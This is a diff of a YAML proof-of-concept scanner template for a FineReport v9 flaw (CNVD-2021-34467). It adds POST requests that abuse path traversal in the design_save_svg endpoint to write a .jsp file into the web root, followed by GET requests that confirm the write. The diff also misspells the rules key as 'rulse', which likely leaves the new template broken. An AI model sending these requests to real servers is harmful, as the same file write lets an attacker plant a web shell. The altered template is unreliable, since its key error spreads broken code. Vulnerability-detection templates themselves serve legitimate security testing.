@@ -1,21 +1,45 @@
 name: poc-yaml-finereport-v9-cnvd-2021-34467
+transport: http
 set:
   r: randomLowercase(10)
-rules:
-  - method: POST
-    path: /WebReport/ReportServer?op=svginit&cmd=design_save_svg&filePath=chartmapsvg/../../../{{r}}.svg.jsp
-    headers:
-      Content-Type: application/json;charset=UTF-8
-    body: '{"__CONTENT__":{{r}},"__CHARSET__":"UTF-8"}'
-    follow_redirects: false
+rulse:
+  r1:
+    request:
+      method: POST
+      path: /WebReport/ReportServer?op=svginit&cmd=design_save_svg&filePath=chartmapsvg/../../../{{r}}.svg.jsp
+      headers:
+        Content-Type: application/json;charset=UTF-8
+      body: '{"__CONTENT__":{{r}},"__CHARSET__":"UTF-8"}'
+      follow_redirects: false
     expression: true
-
-  - method: GET
-    path: /WebReport/{{r}}.svg.jsp
-    follow_redirects: false
+  r2:
+    request:
+      method: GET
+      path: /WebReport/{{r}}.svg.jsp
+      follow_redirects: false
     expression: |
       response.status==200 &&
       response.body.bcontains(bytes(r))
+  r3:
+    request:
+      method: POST
+      path: /ReportServer?op=svginit&cmd=design_save_svg&filePath=chartmapsvg/../../../{{r}}.svg.jsp
+      headers:
+        Content-Type: application/json;charset=UTF-8
+      body: '{"__CONTENT__":{{r}},"__CHARSET__":"UTF-8"}'
+      follow_redirects: false
+    expression: true
+  r4:
+    request:
+      method: GET
+      path: /{{r}}.svg.jsp
+      follow_redirects: false
+    expression: |
+      response.status==200 &&
+      response.body.bcontains(bytes(r))
+expression:
+  (r1() && r2()) || (r3() && r4())
+
 detail:
   finereport_version: 9
   author: Infiltrator(https://github.com/NHPT)
